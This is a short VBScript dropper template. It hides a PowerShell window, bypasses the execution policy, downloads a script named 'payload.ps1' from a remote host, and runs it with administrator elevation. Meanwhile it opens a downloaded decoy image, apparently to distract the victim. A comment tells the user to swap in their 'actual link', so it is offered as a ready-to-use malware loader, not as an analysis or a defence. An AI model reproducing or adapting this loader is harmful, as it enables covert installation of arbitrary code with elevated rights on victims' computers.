Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell.exe -ExecutionPolicy Bypass -Command ""$dl = $env:USERPROFILE + '\Downloads'; " & _
'change the URL with your actual link
"Invoke-WebRequest -Uri 'http://192.168.0.115:8000/test1.ps1' -OutFile ($dl + '\payload.ps1'); " & _ 
"Invoke-WebRequest -Uri 'http://192.168.0.115:8000/login1.jpg' -OutFile ($dl + '\login1.jpg'); " & _
"Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass', '-File', ($dl + '\payload.ps1') -Verb RunAs; " & _
"Start-Sleep -Seconds 3; " & _
"Start-Process ($dl + '\login1.jpg')""", 0, False
